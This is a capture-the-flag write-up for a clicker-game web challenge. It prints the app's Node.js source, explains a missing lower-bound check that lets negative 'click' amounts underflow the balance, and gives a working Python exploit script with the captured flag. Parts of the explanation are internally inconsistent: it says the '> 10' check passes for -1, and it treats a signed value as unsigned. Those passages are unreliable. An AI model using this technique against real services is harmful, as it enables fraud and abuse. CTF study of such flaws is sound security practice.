# Acorn Clicker

## Description

Click acorns. Buy squirrels. Profit.

Author: Kyle

## Source Code Analysis

This challenge presents a Node.js + Express web app with MongoDB used as a backend. Users can register, log in, and perform actions via JWT-authenticated routes. 
The core functionality revolves around clicking to earn "acorns" (balance), then spending those acorns to buy different types of squirrels, including a special flag_squirrel, that reveals the flag if purchased.
The click-to-earn mechanism exposed by `/api/click` let a logged-in user increment its balance by small amounts (max 10 per click).
The flag costs an absurdly large amount (999999999999999999), making it seemingly unpurchasable via normal means.

```javascript
const express = require("express");
const { MongoClient } = require("mongodb");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const BSON = require("bson");

const app = express();
app.use(express.json());

const url = process.env.ME_CONFIG_MONGODB_URL || "mongodb://localhost:27017";

const client = new MongoClient(url, {
  useBigInt64: true,
});
let db;

const JWT_SECRET = process.env.SECRET_KEY || "this_is_a_secret_key";
const JWT_EXPIRATION = "1h"; // Token expiration time
const FLAG = process.env.FLAG || "ctf{this_is_a_fake_flag}";

SQUIRREL_PRICES = {
  squirrel: 50,
  golden_squirrel: 100,
  flag_squirrel: 999999999999999999,
};

async function start() {
  await client.connect();
  db = client.db("ctf_challenge");
  console.log("Database initialized");
}

app.post("/api/register", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).send("Missing username or password");
  }

  const existing = await db.collection("accounts").findOne({ username });
  if (existing) {
    return res.status(400).send("Username already exists");
  }

  const hashedPassword = await bcrypt.hash(password, 10);
  await db
    .collection("accounts")
    .insertOne({ username, password: hashedPassword, balance: BigInt(0) });
  const token = jwt.sign({ username }, JWT_SECRET, {
    expiresIn: JWT_EXPIRATION,
  });
  res.json({ token });
});

app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).send("Missing username or password");
  }

  if (username.length > 20) {
    return res.status(400).send("Username too long");
  }

  if (username.length < 3) {
    return res.status(400).send("Username too short");
  }

  const account = await db.collection("accounts").findOne({ username });
  if (!account) {
    return res.status(400).send("Invalid username or password");
  }

  const isPasswordValid = await bcrypt.compare(password, account.password);
  if (!isPasswordValid) {
    return res.status(400).send("Invalid username or password");
  }

  const token = jwt.sign({ username }, JWT_SECRET, {
    expiresIn: JWT_EXPIRATION,
  });
  res.json({ token });
});

app.post("/api/click", authenticate, async (req, res) => {
  // increase user balance
  const { username } = req.user;
  const { amount } = req.body;

  if (typeof amount !== "number") {
    return res.status(400).send("Invalid amount");
  }

  if (amount > 10) {
    return res.status(400).send("Invalid amount");
  }

  let bigIntAmount;

  try {
    bigIntAmount = BigInt(amount);
  } catch (err) {
    return res.status(400).send("Invalid amount");
  }

  await db
    .collection("accounts")
    .updateOne({ username }, { $inc: { balance: bigIntAmount } });

  res.json({ earned: amount });
});

app.get("/api/balance", authenticate, async (req, res) => {
  // get user balance
  const { username } = req.user;

  const account = await db.collection("accounts").findOne({ username });
  if (!account) {
    return res.status(400).send("Invalid username");
  }

  res.json({ balance: account.balance.toString() });
});

app.post("/api/buy-squirrel", authenticate, async (req, res) => {
  const { username } = req.user;
  const { type } = req.body;

  if (!SQUIRREL_PRICES[type]) {
    return res.status(400).send("Invalid squirrel type");
  }

  const account = await db.collection("accounts").findOne({ username });
  if (!account) {
    return res.status(400).send("Invalid username");
  }

  if (account.balance < SQUIRREL_PRICES[type]) {
    return res.status(400).send({ message: "Not enough acorns" });
  }

  await db
    .collection("accounts")
    .updateOne({ username }, { $inc: { balance: -SQUIRREL_PRICES[type] } });

  if (type === "flag_squirrel") {
    return res.json({ message: FLAG });
  }

  res.json({ message: "Squirrel bought" });
});

// Middleware to verify JWT token
function authenticate(req, res, next) {
  const token = req.headers["authorization"]?.replace("Bearer ", "");
  if (!token) {
    return res.status(401).send("Authorization token required");
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).send("Invalid or expired token");
  }
}

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/static/index.html");
});

app.get("/market", (req, res) => {
  res.sendFile(__dirname + "/static/market.html");
});

app.get("/register", (req, res) => {
  res.sendFile(__dirname + "/static/register.html");
});

start().then(() =>
  app.listen(8080, () => console.log("Server running on http://localhost:8080"))
);
```


## Exploit

The key vulnerability lies in the BigInt + lack of lower-bound checks, allowing unsigned integer underflow behavior when interpreted in the database.

```javascript
const client = new MongoClient(url, {
  useBigInt64: true,
});
let db;
```

```javascript
app.post("/api/click", authenticate, async (req, res) => {
  // increase user balance
  const { username } = req.user;
  const { amount } = req.body;

  if (typeof amount !== "number") {
    return res.status(400).send("Invalid amount");
  }

  if (amount > 10) {
    return res.status(400).send("Invalid amount");
  }

  let bigIntAmount;

  try {
    bigIntAmount = BigInt(amount);
  } catch (err) {
    return res.status(400).send("Invalid amount");
  }

  await db
    .collection("accounts")
    .updateOne({ username }, { $inc: { balance: bigIntAmount } });

  res.json({ earned: amount });
});
```

In `/api/click` there is no check for negative values:

* if `amount = -1` the check `if (amount > 10)` is true;
* the balance is incremented with `$inc: { balance: -1n }`.

MongoDB stores this as a signed 64-bit integer, so decrementing a balance of 0 with -1 wraps to $2^{64} - 1 = 18446744073709551615 > 999999999999999999$.
At this point the balance enables to buy the flag.

```python
import requests
import uuid

register_url = "http://52.188.82.43:8090/api/register"
login_url = "http://52.188.82.43:8090/api/login"
click_url = "http://52.188.82.43:8090/api/click"
balance_url = "http://52.188.82.43:8090/api/balance"
flag_url = "http://52.188.82.43:8090/api/buy-squirrel"

username = str(uuid.uuid4())[:10]
password = str(uuid.uuid4())

# register
resp = requests.post(register_url, json={"username": username, "password": password})

# login 
resp = requests.post(login_url, json={"username": username, "password": password})
token = resp.json()["token"]

balance = 0
# click
while balance < 999999999999999999:
    resp = requests.post(click_url, json={"amount": -1}, headers={"Authorization": f"{token}"})
    resp = requests.get(balance_url, headers={"Authorization": f"{token}"})
    balance = int(resp.json()["balance"])
    print(balance)

resp = requests.post(flag_url, headers={"Authorization": f"{token}"}, json={"type": "flag_squirrel"})
print(resp.json())
```

response:

```JSON
{'balance': "18446744073709551615"}
{'message': "squ1rrel{1nc0rr3ct_d3s3r1al1zat10n?_1n_MY_m0ng0?}"}
```